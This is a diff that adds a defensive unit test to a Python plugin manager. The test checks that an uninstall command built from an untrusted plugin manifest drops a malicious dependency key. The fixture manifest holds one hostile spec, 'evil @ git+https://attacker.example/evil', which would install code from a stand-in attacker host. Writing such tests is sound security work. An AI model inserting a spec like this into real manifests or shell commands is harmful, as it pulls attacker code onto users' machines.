@@ -957,6 +957,44 @@ def test_a_downloaded_pack_is_uninstalled_when_its_files_do_go(
     assert plugin_loader.removed_ids(plugin_loader.load_lockfile()) == set()
 
 
+def test_a_dep_name_no_install_would_accept_stays_out_of_the_command(
+    isolated_lockfile
+):
+    """``uninstall_command`` is a line the user is invited to paste into a
+    shell, built out of an untrusted manifest table. A key like ``evil @
+    git+https://...`` is exactly what ``deps.dep_specs`` refuses to install,
+    so it must not travel from that manifest into somebody's terminal by the
+    other door -- and a package that could never have been installed cannot
+    have been left behind either."""
+    plugin_dir = isolated_lockfile / "ghost"
+    _write_plugin_dir(plugin_dir, "ghost")
+    (plugin_dir / "cdui.plugin.toml").write_text(
+        dedent("""\
+            [plugin]
+            id = "ghost"
+            name = "Local ghost"
+            version = "0.1.0"
+            schema_version = 1
+
+            [python_deps]
+            tabulate = ">=0.9"
+            "evil @ git+https://attacker.example/evil" = ""
+            """),
+        encoding="utf-8",
+    )
+    lockfile = plugin_loader.load_lockfile()
+    lockfile.setdefault("plugins", {})["ghost"] = {
+        "source_kind": "github_url", "source": "alice/ghost", "enabled": True,
+    }
+    plugin_loader.save_lockfile(lockfile)
+
+    outcome = lifecycle.uninstall_plugin("ghost")
+    assert outcome is not None
+    assert outcome.python_deps_left == ("tabulate",)
+    assert outcome.uninstall_command.endswith(" tabulate")
+    assert "git+" not in outcome.uninstall_command
+
+
 def test_cmd_reload_no_server_returns_zero(isolated_lockfile):
     # _backend_reload stubbed to False (no server) — reload is a graceful no-op.
     assert plugin_cli.cmd_reload(argparse.Namespace()) == 0
